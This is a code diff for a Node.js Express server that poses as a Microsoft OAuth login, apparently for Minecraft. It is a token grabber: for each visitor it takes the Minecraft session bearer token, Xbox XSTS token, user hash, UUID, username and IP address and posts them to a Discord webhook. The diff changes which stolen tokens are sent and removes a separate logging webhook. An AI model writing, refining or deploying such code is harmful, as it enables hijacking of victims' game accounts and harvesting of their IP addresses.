@@ -1,9 +1,8 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = ''
+const client_id = ''
+const redirect_uri = ''
+const webhook_url = ''
 // Config end
 const axios = require('axios')
 const express = require('express')
@@ -19,7 +18,6 @@ app.get('/', async (req, res) => {
     try {
         const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
         const accessToken = accessTokenAndRefreshTokenArray[0]
-        const refreshToken = accessTokenAndRefreshTokenArray[1]
         const hashAndTokenArray = await getUserHashAndToken(accessToken)
         const userToken = hashAndTokenArray[0]
         const userHash = hashAndTokenArray[1]
@@ -29,11 +27,10 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         if (checkIfBanned(username)) {
-            logToWebhook("Reject", "A person has been rejected.")
             return
         }
         const ip = getIp(req)
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+        postToWebhook(username, bearerToken, uuid, ip, xstsToken, userHash)
     } catch (e) {
         console.log(e)
     }
@@ -126,8 +123,9 @@ function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
 
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+function postToWebhook(username, bearerToken, uuid, ip, xsts, userHash) {
     const url = webhook_url
+
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
@@ -138,31 +136,13 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
                 {name: "UUID", value: uuid, inline: true},
                 {name: "Ip", value: ip, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
-                {name: "Refresh Token", value: refreshToken, inline: false},
+                {name: "XSTS", value:xsts , inline: true},
+                {name: "UserHash", value:userHash , inline: true},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
             ]
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
-    logToWebhook("Accepted", "A person has been accepted and it has been sent to the webhook.")
-}
-
-function logToWebhook(title, message) {
-    const url = webhook_logging_url
-
-    let data = {
-        username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: " ",
-        embeds: [{
-            title: "Log", color: 0x00ff50, fields: [
-                {name: title, value: ""},
-                {name: message, value: ""}
-            ]
-        }
-        ]
-    }
-    axios.post(url, data).then(() => console.log("Logging to discord."))
 }
 
 const bannedNames = []
